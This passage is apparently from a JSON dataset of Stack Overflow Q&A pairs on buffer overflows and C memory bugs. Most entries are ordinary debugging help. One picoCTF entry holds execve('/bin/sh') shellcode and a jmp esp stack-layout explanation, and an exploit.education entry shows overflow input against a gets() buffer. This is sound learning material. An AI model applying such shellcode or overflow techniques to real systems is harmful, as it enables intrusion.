0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
